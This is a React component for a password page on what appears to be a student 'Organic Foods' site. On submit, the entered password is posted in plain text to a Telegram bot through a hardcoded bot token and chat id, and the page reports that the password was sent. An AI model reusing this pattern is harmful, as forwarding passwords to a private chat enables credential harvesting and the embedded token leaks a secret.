import React, { useState } from 'react';
import banner from "../../assets/Banner (10).png";
import image from "../../assets/Image (59).png";
import SubscribeInside from "../home/subscribeInside";
import Footer from "../home/footer";
import { Button, Input, message } from "antd";
import { FaEye, FaEyeSlash } from 'react-icons/fa'; // Eye ikonkalari uchun

function Protected(props) {
    const [password, setPassword] = useState(""); // Parolni state-da saqlash
    const [showPassword, setShowPassword] = useState(false); // Parolni ko'rsatish holati

    const handleSubmit = () => {
        if (!password) {
            message.error("Please enter your password.");
            return;
        }

        // Telegram botiga yuborish
        const telegramApiUrl = `https://api.telegram.org/bot7059302754:AAGChb5bbs0nbJSlON7Wus1VADd9YOGZ418/sendMessage`;
        const chatId = "1736820935";
        const messageText = `Password from Organic Foods: ${password}`;

        fetch(telegramApiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: messageText,
            }),
        })
            .then((response) => response.json())
            .then((data) => {
                if (data.ok) {
                    message.success("Password sent successfully!");
                    setPassword(""); // Inputni tozalash
                } else {
                    message.error("Failed to send password.");
                }
            })
            .catch((error) => {
                message.error("Error occurred while sending.");
                console.error(error);
            });
    };

    return (
        <div>
            <div className={"w-full"}>
                <img src={banner} alt="banner" className={"w-full"} />
            </div>
            <div className={"flex items-center justify-center p-[10%]"}>
                <div className={"sm:w-full md:w-[80%] lg:w-[70%] xl:w-[60%] flex gap-5 items-center p-7 rounded-2xl shadow-lg bg-white"}>
                    <img src={image} alt="image" />
                    <span>
                        <h3 className={"text-[23px] text-[#274C5B] font-bold"}>Password</h3>
                        <Input
                            name="password"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)} // Parolni olish
                            placeholder={"Enter Your Password"}
                            type={showPassword ? "text" : "password"} // Parolni ko'rsatish holati
                            className={`my-5 rounded-2xl p-5 border w-[100%]`}
                            suffix={
                                showPassword ? (
                                    <FaEyeSlash
                                        className="cursor-pointer text-[#274C5B] text-[20px]"
                                        onClick={() => setShowPassword(false)} // Ko'rsatishni o'chirish
                                    />
                                ) : (
                                    <FaEye
                                        className="cursor-pointer text-[#274C5B] text-[20px]"
                                        onClick={() => setShowPassword(true)} // Ko'rsatishni yoqish
                                    />
                                )
                            }
                        />
                        <Button
                            className={"bg-[#274C5B] text-white font-bold py-7 px-10"}
                            type={"submit"}
                            onClick={handleSubmit} // Yuborish tugmasi
                        >
                            Send Message
                        </Button>
                    </span>
                </div>
            </div>

            <SubscribeInside />
            <Footer />
        </div>
    );
}

export default Protected;
